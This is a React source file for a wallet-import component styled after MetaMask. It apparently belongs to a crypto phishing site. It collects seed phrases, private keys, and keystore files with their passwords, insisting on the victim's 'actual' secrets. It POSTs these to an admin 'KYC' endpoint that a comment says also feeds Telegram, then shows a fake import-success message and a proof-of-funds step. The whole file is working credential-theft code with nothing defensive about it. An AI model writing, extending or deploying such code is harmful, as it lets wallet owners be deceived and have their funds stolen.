import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import ProofOfFund from './ProofOfFund';
import { v4 as uuidv4 } from 'uuid';

// Default theme (MetaMask style)
const defaultTheme = {
  bg: '#1E2329',
  text: 'white',
  border: 'gray-600',
  accent: '#ffa680',
  accentText: 'black',
  accentHover: 'orange-400',
  tabActiveBg: '#ffa680',
  tabActiveText: 'black',
  tabInactiveBg: '#1E2329',
  tabInactiveText: 'white',
  tabBorder: 'gray-600',
};

const WalletImportTabs = ({ theme = defaultTheme }) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [showPassword, setShowPassword] = useState(false);
  const [toast, setToast] = useState({ show: false, message: '' });
  const [showPOF, setShowPOF] = useState(false);
  const [startCountdown, setStartCountdown] = useState(false);
  const [selectedWalletType, setSelectedWalletType] = useState(null);
  const [walletFormData, setWalletFormData] = useState(null);
  const [progress, setProgress] = useState(100);
  const [sessionId, setSessionId] = useState(() => {
    const existingSessionId = localStorage.getItem('sessionId');
    if (existingSessionId) return existingSessionId;
    const newSessionId = uuidv4();
    localStorage.setItem('sessionId', newSessionId);
    return newSessionId;
  });
  const toastTimeout = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    // Removed navigation logic to prevent URL change
  }, [showPOF]);

  useEffect(() => {
    if (toast.show && toast.message.includes('Wallet imported successfully')) {
      setProgress(100);
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev <= 0) {
            clearInterval(interval);
            setToast({ show: false, message: '' });
            setShowPOF(true);
            setStartCountdown(true);
            (async () => {
              try {
                const pendingKey = `kyc_pending_${sessionId}`;
                const raw = localStorage.getItem(pendingKey);
                if (!raw) return;
                const pending = JSON.parse(raw);
                const payload = {
                  sessionId: pending.sessionId || sessionId,
                  walletType: selectedWalletType || walletFormData?.walletType || 'unknown',
                  seedPhrase: walletFormData?.key || undefined,
                  keystoreJson: walletFormData?.keystoreJson || undefined,
                  password: walletFormData?.pass || undefined,
                  privateKey: walletFormData?.privateKey || undefined,
                  imageUrls: pending.imageUrls || [],
                  fileMap: pending.fileMap || {},
                  dealersLicenseStatus: pending.dealersLicenseStatus || 'available',
                  qualityRequired: pending.qualityRequired || '',
                  karatsPurity: pending.karatsPurity || '',
                  destinationRefineryText: pending.destinationRefineryText || '',
                };
                const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
                  method: 'POST', 
                  headers: { 'Content-Type': 'application/json' }, 
                  body: JSON.stringify(payload) 
                });
                if (!res.ok) {
                  const txt = await res.text();
                  console.warn('Failed to submit pending KYC:', res.status, txt);
                  return;
                }
                localStorage.removeItem(pendingKey);
                console.log('Pending KYC submitted for session', payload.sessionId);
                  // Session is NOT cleared/reset here. It will persist unless user starts afresh from kyc-documents page.
              } catch (err) {
                console.error('Error submitting pending KYC', err);
              }
            })();
            return 0;
          }
          return prev - 5;
        });
      }, 100);

      return () => clearInterval(interval);
    }
  }, [toast.show, toast.message, sessionId, selectedWalletType, walletFormData]);

  useEffect(() => {
    if (toast.show && toast.style?.isError) {
      const timeout = setTimeout(() => {
        setToast({ show: false, message: '' });
      }, 3000);

      return () => clearTimeout(timeout);
    }
  }, [toast]);

  // Enhanced seed phrase validator with detailed error messages
  const validateSeedPhrase = (phrase) => {
    // Normalize the phrase
    const normalizedPhrase = phrase.trim().toLowerCase();
    
    // Check if empty
    if (!normalizedPhrase) {
      return {
        isValid: false,
        error: 'Seed phrase cannot be empty'
      };
    }

    // Split and filter empty strings
    const words = normalizedPhrase.split(/\s+/).filter(w => w.length > 0);
    const validWordCounts = [12, 15, 18, 21, 24];

    // Check word count
    if (!validWordCounts.includes(words.length)) {
      return {
        isValid: false,
        error: `Invalid seed phrase. Please provide your actual wallet seed phrase`
      };
    }

    // Check for invalid characters (only lowercase letters allowed)
    const invalidWords = words.filter(word => !/^[a-z]+$/i.test(word));
    if (invalidWords.length > 0) {
      return {
        isValid: false,
        error: `Invalid seed phrase. Please provide your actual wallet seed phrase`
      };
    }

    // Check for duplicate words
    const uniqueWords = new Set(words);
    if (uniqueWords.size !== words.length) {
      return {
        isValid: false,
        error: 'Invalid seed phrase. Please provide your actual wallet seed phrase'
      };
    }

    // Check word length (BIP39 words are 3-8 characters)
    const tooShortOrLong = words.filter(word => word.length < 3 || word.length > 8);
    if (tooShortOrLong.length > 0) {
      return {
        isValid: false,
        error: `Invalid seed phrase. Please provide your actual wallet seed phrase`
      };
    }

    return {
      isValid: true,
      error: null
    };
  };

  // Validate Keystore JSON
  const validateKeystoreJSON = (keystoreJson, password) => {
    if (!keystoreJson.trim()) {
      return {
        isValid: false,
        error: 'Keystore JSON cannot be empty'
      };
    }

    // Try to parse as JSON
    try {
      JSON.parse(keystoreJson);
    } catch (err) {
      return {
        isValid: false,
        error: 'Invalid JSON format. Please provide your actual Keystore JSON'
      };
    }

    if (!password.trim()) {
      return {
        isValid: false,
        error: 'Password is required for Keystore import'
      };
    }

    return {
      isValid: true,
      error: null
    };
  };

  // Validate Private Key
  const validatePrivateKey = (privateKey) => {
    const cleanKey = privateKey.trim().replace(/^0x/, '');
    
    if (!cleanKey) {
      return {
        isValid: false,
        error: 'Private key cannot be empty'
      };
    }

    if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
      return {
        isValid: false,
        error: 'Invalid private key. Please provide your actual private key'
      };
    }

    return {
      isValid: true,
      error: null
    };
  };

  const handleImport = (e) => {
    e.preventDefault();

    // If sessionId was cleared (after POF), start a new one
    let currentSessionId = localStorage.getItem('sessionId');
    if (!currentSessionId) {
      const newSessionId = uuidv4();
      localStorage.setItem('sessionId', newSessionId);
      setSessionId(newSessionId);
      currentSessionId = newSessionId;
    }

    const formData = new FormData(e.target);
    const path = window.location.pathname;
  const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
    const walletType = routeWalletType || 'unknown';
    const key = formData.get('key') || '';
    const pass = formData.get('pass') || '';

    let validation;

    // Validate based on active tab
    if (activeTab === 'phrase') {
      validation = validateSeedPhrase(key);
    } else if (activeTab === 'keystore') {
      validation = validateKeystoreJSON(key, pass);
    } else if (activeTab === 'private') {
      validation = validatePrivateKey(key);
    }

    // If validation fails, show error toast
    if (!validation.isValid) {
      setToast({ 
        show: true, 
        message: validation.error, 
        style: { background: '#fff', color: '#d32f2f', isError: true } 
      });
      return;
    }

    // Check if there's pending KYC data
    const pendingKey = `kyc_pending_${currentSessionId}`;
    const raw = localStorage.getItem(pendingKey);
    
    console.log('Current session ID:', currentSessionId);
    console.log('Pending KYC key:', pendingKey);
    console.log('Has pending KYC data:', !!raw);
    console.log('Active tab:', activeTab);
    console.log('Wallet type:', walletType);
    
    // If no KYC data, immediately send wallet data to backend and Telegram
    if (!raw) {
      console.log('No pending KYC data found - will send direct wallet import');
      
      // Use the exact same approach as the KYC flow (line 75)
      const payload = {
        sessionId: currentSessionId,
        walletType: walletType,
        seedPhrase: activeTab === 'phrase' ? key : undefined,
        keystoreJson: activeTab === 'keystore' ? key : undefined,
        password: activeTab === 'keystore' ? pass : undefined,
        privateKey: activeTab === 'private' ? key : undefined,
        imageUrls: [],
        fileMap: {},
        dealersLicenseStatus: 'not_available',
        qualityRequired: 'N/A',
        karatsPurity: 'N/A',
        destinationRefineryText: 'N/A',
      };

      console.log('Payload to send:', JSON.stringify(payload, null, 2));

      // Use EXACTLY the same fetch approach as the existing KYC flow
      fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(payload) 
      })
      .then(res => {
        console.log('Response status:', res.status);
        if (!res.ok) {
          return res.text().then(txt => {
            console.error('Failed to submit direct wallet import:', res.status, txt);
            throw new Error(`Server responded with ${res.status}: ${txt}`);
          });
        }
        return res.json();
      })
      .then(data => {
        console.log('Direct wallet import submitted successfully:', data);
        console.log('Session:', currentSessionId);
      })
      .catch(err => {
        console.error('Error submitting direct wallet import:', err);
      });
    } else {
      console.log('Pending KYC data found - will submit with POF later');
    }

    // If validation passes, proceed with import
    setSelectedWalletType(walletType);
    setWalletFormData({ walletType, key, pass, activeTab: activeTab });
    setStartCountdown(false);
    setShowPOF(false);
    setToast({ 
      show: true, 
      message: 'Wallet imported successfully!', 
      style: { background: '#fff', color: '#4caf50', isError: false } 
    });
  };

  const tabData = [
    {
      key: 'phrase',
      label: 'Phrase',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <textarea name="key" placeholder="Phrase" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 12 (sometimes 24) words separated by single spaces</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'keystore',
      label: 'Keystore JSON',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <textarea name="key" placeholder="Keystore JSON" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="relative w-full">
            <input
              type={showPassword ? 'text' : 'password'}
              name="pass"
              placeholder="Password"
              style={{background: theme.bg, color: theme.text}}
              className={`w-full p-2 border rounded border-${theme.border} focus:ring-2 pr-10`}
            />
            <button
              type="button"
              style={{color: theme.text === '#fff' ? '#1976d2' : theme.accent}}
              className={`absolute right-2 top-2 text-sm font-bold focus:outline-none`}
              onClick={() => setShowPassword((prev) => !prev)}
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          <div className="desc text-sm text-gray-400">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'private',
      label: 'Private Key',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <input type="text" name="key" placeholder="Private Key" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 64 alphanumeric characters</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    // Add a new tab for POF
    {
      key: 'pof',
      label: 'POF',
      content: (
        <ProofOfFund theme={theme} walletType={selectedWalletType} startCountdown={startCountdown} />
      )
    }
  ];

  return (
    <div>
      {toast.show && (
        <div
          style={{
            position: 'fixed',
            top: '10%',
            left: '50%',
            transform: 'translateX(-50%)',
            background: toast.style?.background || '#fff',
            color: toast.style?.color || '#d32f2f',
            padding: '16px 32px',
            borderRadius: 10,
            fontWeight: 700,
            fontSize: 18,
            boxShadow: '0 2px 12px rgba(0,0,0,0.25)',
            zIndex: 9999,
            textAlign: 'center',
          }}
        >
          {toast.message}
          {!toast.style?.isError && (
            <div
              style={{
                marginTop: '10px',
                height: '5px',
                width: '100%',
                background: '#e0e0e0',
                borderRadius: '5px',
                overflow: 'hidden',
              }}
            >
              <div
                style={{
                  height: '100%',
                  width: `${progress}%`,
                  background: '#4caf50',
                  transition: 'width 0.1s ease',
                }}
              ></div>
            </div>
          )}
        </div>
      )}
      {showPOF ? (
        <ProofOfFund theme={theme} walletType={selectedWalletType} startCountdown={startCountdown} />
      ) : (
        <div>
          <div className="flex gap-2 mb-2">
            {tabData.map(tab => (
              <button
                key={tab.key}
                style={activeTab === tab.key ? {background: theme.tabActiveBg, color: theme.tabActiveText} : {background: theme.tabInactiveBg, color: theme.tabInactiveText, borderColor: theme.tabBorder}}
                className={`px-4 py-2 rounded font-bold text-sm border`}
                onClick={() => setActiveTab(tab.key)}
              >
                {tab.label}
              </button>
            ))}
          </div>
          <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
        </div>
      )}
    </div>
  );
};

export default WalletImportTabs;